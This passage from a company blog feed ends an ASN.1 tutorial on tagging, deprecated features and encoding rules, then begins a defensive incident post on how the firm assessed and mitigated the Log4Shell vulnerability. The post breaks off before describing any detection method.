newer version, say version 3 of this type
one, you should just add the new enum under the previous enums.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">QosMonitoringRequest ::= ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ul,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    dl,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    both,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ...,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    stop,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    half</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">} -- imaginary version 3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>For <code>SEQUENCE</code>, <code>SET</code> and <code>CHOICE</code> one could either do the same, or to
keep the versions separated, add another extension mark with the new
fields in between. One could also add version brackets to group the
extensions and highlight the differences.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">Ax ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    a INTEGER (250..253),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    b BOOLEAN,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    c CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        d INTEGER, -- version 1</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        ...,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        [[</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            e BOOLEAN,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            f IA5String</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        ]],</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        ... -- version 2</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ..., -- version 1</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    [[</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        g NumericString (SIZE(3)),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        h BOOLEAN OPTIONAL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ]],</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ..., -- version 2</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    i BMPString OPTIONAL,  -- version 3</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    j PrintableString OPTIONAL -- version 3</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Only the types <code>ENUMERATED</code>, <code>SEQUENCE</code>, <code>SET</code> and <code>CHOICE</code>, as well
as subtype constraints, and object and value sets can be extended.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="automatic-implicit-explicit-tags">Automatic, Implicit, Explicit tags<a class="hash-link" href="#automatic-implicit-explicit-tags" title="Direct link to heading">​</a></h2><p>When an value is transmitted all ambiguities need to be removed. That
is why every type needs to have an unique identifier, called a tag.</p><p>The section <a href="#default-and-optional-keywords">DEFAULT and OPTIONAL
keywords</a> has a good example I will
explain.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">CollectedDigits ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  minimumNbOfDigits    [0] INTEGER (1..16) DEFAULT 1,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  maximumNbOfDigits    [1] INTEGER (1..16),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  endOfReplyDigit      [2] OCTET STRING (SIZE (1..2)) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  cancelDigit          [3] OCTET STRING (SIZE (1..2)) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  startDigit           [4] OCTET STRING (SIZE (1..2)) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  firstDigitTimeOut    [5] INTEGER (1..127) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  interDigitTimeOut    [6] INTEGER (1..127) OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  errorTreatment       [7] ErrorTreatment DEFAULT stdErrorAndInfo,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  interruptableAnnInd  [8] BOOLEAN DEFAULT TRUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  voiceInformation     [9] BOOLEAN DEFAULT FALSE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  voiceBack            [10] BOOLEAN DEFAULT FALSE</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>In this sequence we can see that many of the values are optional and
some have defaults, only the value <code>maximumNbOfDigits</code> is mandatory.</p><p>When the sending side transmits a value of <code>CollectedDigits</code> type, the
receiving side will get a sequence of the values mentioned. With
BER-encoding each defined value will have an identifier, a length (of
the value transmitted) and the value. This is called a
Tag-Length-Value or TLV for short.</p><p>All basic types already has an universal tag as stated in the <a href="#types">types
table</a>, but the composite types does not. (If not tagged, how
would it see the difference between <code>endOfReplyDigit</code>, <code>cancelDigit</code>
and <code>startDigit</code> in the example above?)</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">RoutingInformation ::= CHOICE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  reroutingNumber    [0] IMPLICIT IsdnNumber,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  forwardedToNumber  [1] IMPLICIT IsdnNumber</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">IsdnNumber ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  typeOfAddress  TypeOfAddress,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  digits         TelephonyString</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">TypeOfAddress ::= ENUMERATED {national(0), international(1), private(2)}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">TelephonyString ::=</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  IA5String</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    (FROM ("0" | "1" | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9" | "*" |</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">           "#"))(SIZE (1..15))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>A value of <code>RoutingInformation</code> in this example will with BER encoding
only transmit the tag <code>[0]</code> or <code>[1]</code> (and of course the length and
value). It counts on that the receiving part has the same version of
the ASN.1 and knows the abstract syntax. If it wouldn't have been
<code>IMPLICIT</code>, then it would have sent either tags <code>[0]</code> or <code>[1]</code>
followed by the tags for <code>TypeOfAddress</code> (ENUMERATED) <code>[10]</code>, and tags
for <code>TelephonyString</code> (IA5String) <code>[4]</code>.</p><p>One can specify <code>IMPLICIT</code> and <code>EXPLICIT</code> tagging on module basis,
where the <code>DEFINITIONS</code> are assigned.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS IMPLICIT TAGS ::= BEGIN</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Instead of writing all the tags self (explicitly in both cases), one
can instead use the keywords <code>AUTOMATED TAGS</code>.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">DEFINITIONS AUTOMATIC TAGS ::= BEGIN</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>This will add tags to the composit types that doesn't have them
(explicitly) set.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="deprecations-and-discouragements">Deprecations and discouragements<a class="hash-link" href="#deprecations-and-discouragements" title="Direct link to heading">​</a></h2><p>Some things have been deprecated from earlier ASN.1 specifications,
and use of these are strongly discouraged.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="any">ANY<a class="hash-link" href="#any" title="Direct link to heading">​</a></h3><p>First out is the <code>ANY</code> type, which could take the form of any
value. It's like an unrestricted <code>CHOICE</code> type.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">Invoke ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    invokeID           InvokeIdType,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    linkedID       [0] InvokeIdType OPTIONAL,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    operationCode      MAP-OPERATION,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    parameter          InvokeParameter OPTIONAL</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">InvokeParameter ::= ANY</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Problem with this is that the ASN.1 compiler does not have a formal
way of knowing which values are approved. The use of <code>ANY</code> also
usually meant it was coupled with some other value, for instance the
<code>operationCode</code> in the example above.</p><p>To make this link one could have used <code>DEFINED BY</code> specifying which
field the <code>ANY</code> type is coupled with. The drawback with this solution
is that it still has an ambiguous meaning, and the types are of no use
for the application designer.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">ExtensionField ::= SEQUENCE {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    type        INTEGER,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    --  shall identify the value of an EXTENSION type</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    criticality ENUMERATED {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        ignore(0),</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        abort(1)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    } DEFAULT ignore,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    value   [1] ANY DEFINED BY type</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Instead the concept of informal object classes and parameterized
components were introduced.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="macros">Macros<a class="hash-link" href="#macros" title="Direct link to heading">​</a></h3><p>Macros were removed because they were poorly documented and too
general. Because of this they were hard to implement and automate in
the compilers. They follow the BNF notation.</p><div class="language-asn.1 codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asn.1 codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">OPERATION MACRO ::=</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">BEGIN</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    TYPE NOTATION ::= Parameter Result Errors LinkedOperations</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    VALUE NOTATION ::= value (VALUE CHOICE { localValue INTEGER, globalValue OBJECT IDENTIFIER } )</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Parameter ::= ArgKeyword NamedType | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ArgKeyword ::= "ARGUMENT" | "PARAMETER"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Result ::= "RESULT" ResultType | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Errors ::= "ERRORS" "{"ErrorNames"}" | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    LinkedOperations ::= "LINKED" "{"LinkedOperationNames"}" | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ResultType ::= NamedType | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ErrorNames ::= ErrorList | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    ErrorList ::= Error | ErrorList "," Error</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Error ::= value (ERROR)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">             -- shall reference an error value</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">             | type</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">             -- shall reference an error type</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">             -- if no error value is specified</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    LinkedOperationNames ::= OperationList | empty</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    OperationList ::= Operation | OperationList "," Operation</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    Operation ::= value (OPERATION)</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                  -- shall reference an operation value</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                  | type</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                  -- shall reference an operation type if</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">                  -- no operation value is specified</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    NamedType ::= identifier type | type</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">END</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The two needed fields of the macro are <code>TYPE NOTATION</code> and <code>VALUE
NOTATION</code>. The rest of the fields are the value sequence defining what
the macro should insert. Quotes define the string to insert (excluding
the actual quotes), <code>empty</code> inserts nothing. <code>identifier</code>, <code>value</code>, or
<code>type</code> are used to infer different things. Dubuisson has (yet again) a
good chapter on this topic.</p><p>Also here one should use informal object classes and parameterized
components instead of using macros.</p><h1>Encodings</h1><p>There are numerous codecs when transmitting the abstract syntax, all
with different pros and cons.</p><table><thead><tr><th>Short name</th><th>Long name</th></tr></thead><tbody><tr><td>BER</td><td>Basic encoding rules</td></tr><tr><td>DER</td><td>Distinguished encoding rules</td></tr><tr><td>CER</td><td>Canonical encoding rules</td></tr><tr><td>PER</td><td>Packed encoding rules</td></tr><tr><td>OER</td><td>Octet encoding rules</td></tr><tr><td>XER</td><td>XML encoding rules</td></tr><tr><td>EXER</td><td>Extended XML encoding rules</td></tr><tr><td>JER</td><td>JSON encoding rules</td></tr></tbody></table><p>BER is the oldest encoding rule for ASN.1. It uses Tag-Length-Value
format where all tags, lengths and values are multiples of
octets. Because this was the first encoding rule it was named <code>basic</code>
to indicate that there might be more standardized encoding rules in
the future.</p><p>DER and CER are subsets of BER, which was added for developers of
X.400 email and X.500 directory applications. It provides means to
make sure bit strings are not altered during transfer. The main
difference between DER and CER is that DER uses a definite-length
format and CER an indefinite-length format, so CER is best used for
applications that transfer a big amount of data.</p><p>PER is the most compact format, and used for bandwith conservation. It
does not send the Tag of the TLV because the order in which components
of the message occur is known.  PER also does not send the Length of
the TLV if the Value has a fixed length. It uses information from
ASN.1 message description to eliminate redundant information from the
Value portion. It can either be aligned to multiple of octets by
padding each value with '0's, or unaligned (U-PER/Unaligned PER) which
is more compact but take more time to decode.</p><p>OER was adapted from PER and uses an octet oriented format, so the
length of all specified Tags, Lengths, and Values are padded to be
multiples of 8 bits octets as in BER. OER is usually faster than both
BER and PER with regards to encoding and decoding.</p><p>XER, CXER and EXER are used for transmitting XML format. CXER is used
for transmitting data canonically, e.g. used by security applications.
EXER or Extended XER is used when "stylish" features is wanted, and
adds possibility to extend the encoder for instance when wanting to
insert processing instructions or comments into the XML.</p><p>JER is used when transmitting JSON in accordance to the format
specified in
<a href="https://www.ecma-international.org/publications-and-standards/standards/ecma-404/" target="_blank" rel="noopener noreferrer">ECMA-404</a>.</p><p>There are probably a bunch of others as well, but these are the ones
that have a specification.</p><table><thead><tr><th>ITU-T number</th><th>Name</th></tr></thead><tbody><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.690" target="_blank" rel="noopener noreferrer">X.690</a></td><td>ASN.1 encoding rules: Specification of Basic Encoding Rules (BER), Canonical Encoding Rules (CER) and Distinguished Encoding Rules (DER)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.691" target="_blank" rel="noopener noreferrer">X.691</a></td><td>ASN.1 encoding rules: Specification of Packed Encoding Rules (PER)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.692" target="_blank" rel="noopener noreferrer">X.692</a></td><td>ASN.1 encoding rules: Specification of Encoding Control Notation (ECN)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.693" target="_blank" rel="noopener noreferrer">X.693</a></td><td>ASN.1 encoding rules: XML Encoding Rules (XER)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.694" target="_blank" rel="noopener noreferrer">X.694</a></td><td>ASN.1 encoding rules: Mapping W3C XML schema definitions into ASN.1</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.695" target="_blank" rel="noopener noreferrer">X.695</a></td><td>ASN.1 encoding rules: Registration and application of PER encoding instructions</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.696" target="_blank" rel="noopener noreferrer">X.696</a></td><td>ASN.1 encoding rules: Specification of Octet Encoding Rules (OER)</td></tr><tr><td><a href="https://www.itu.int/rec/T-REC-X/recommendation.asp?lang=en&amp;parent=T-REC-X.697" target="_blank" rel="noopener noreferrer">X.697</a></td><td>ASN.1 encoding rules: Specification of JavaScript Object Notation Encoding Rules (JER)</td></tr></tbody></table><h1>Final words</h1><p>Congratulations for making through this blog post. You deserve a
medal, and I hope this can help you understand the complexity and
greatness of ASN.1.</p><p>We have gone through the <strong>basics</strong> of ASN.1, there are still a lot of
things to be uncovered. You now understand the most common basic and
structured types, as well as the main differences between the
different encodings.</p><p>If I write a part 2 I will take you through the Diameter specs
instead, which are much more straighforward.</p><p>Image from <a href="https://xkcd.com" target="_blank" rel="noopener noreferrer">xkcd</a> describing how I feel with ASN.1:</p><a href="https://xkcd.com/208/" target="_blank" rel="noopener noreferrer" class="image"><img loading="lazy" src="https://imgs.xkcd.com/comics/regular_expressions.png" class="img_ev3q"></a>]]></content:encoded>
            <category>telco</category>
            <category>ASN.1</category>
            <category>dia</category>
        </item>
        <item>
            <title><![CDATA[Zero-day vulnerabilities - Log4j]]></title>
            <link>https://www.wgtwo.com/jp/blog/log4j-security-vulnerability</link>
            <guid>log4j-security-vulnerability</guid>
            <pubDate>Fri, 17 Dec 2021 00:00:00 GMT</pubDate>
            <description><![CDATA[On Friday, December 10th, wgtwo and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as “Log4Shell” in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation.]]></description>
            <content:encoded><![CDATA[<p>On Friday, December 10th, <strong>wgtwo</strong> and many others became aware of a critical severity zero-day exploit, CVE-2021-44228, known as “Log4Shell” in the Log4j library, which is widely used in numerous systems around the internet. We immediately opened a security incident and have been actively taking steps to mitigate and monitor the situation.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="friday">Friday<a class="hash-link" href="#friday" title="Direct link to heading">​</a></h2><p>Mitigating 3rd party vulnerabilities is an ability that <strong>wgtwo</strong> has prepared for. The first step in doing so is to assess the impact of the Log4j library across our microservice architecture.</p><p>We knew that all versions of Log4j <code>2.0-beta9 &lt;= Apache log4j &lt;= 2.14.1</code> were affected.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="code">Code<a class="hash-link" href="#code" title="Direct link to heading">​</a></h3><p>Naturally, the first place to look was our codebase and answer the question, do we have java microservices using log4j? Our core application code exists in a monorepo. Having a monorepo makes it easier as there is one place to look. In addition, we use bazel which helps for managing dependencies. After a quick scan through our repo, we found that we had a vulnerable version of log4j as a dependency, but was not used by a service. We cleaned this up and removed Log4j entirely.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="docker-vulnerability-scan-day-1">Docker Vulnerability Scan Day 1<a class="hash-link" href="#docker-vulnerability-scan-day-1" title="Direct link to heading">​</a></h3><p>We use Trivy as our Docker vulnerability scanner. We have integrated this scanner as part of our docker image registry.</p><p>At a first pass, all scans were negative across our infrastructure and we thought we were in the clear. We later identified that this was a false positive as Trivy’s database is only updated every 6 hours and did not include CVE-2021-44228 for around 48 hours after first identified.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="saturday">Saturday<a class="hash-link" href="#saturday" title="Direct link to heading">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="checking-our-infrastructure-ourselves-with-dns-requests">Checking our infrastructure ourselves with DNS requests<a class="hash-link" href="#checking-our-infrastructure-ourselves-with-dns-requests" title="Direct link to heading">​</a></h3><p>At that moment, we want to also evaluate ourselves if we are vulnerable. The early report of log4j exploitation showed that attackers were abusing the user-agent field of public endpoints, such as HTTP endpoints. Those endpoints are often logged using the Apache format, which exposes the user agent and the URL in the logs. In turn, those logs could be post-processed via a component using Log4j.</p><p>One harmless way to detect vulnerability is to 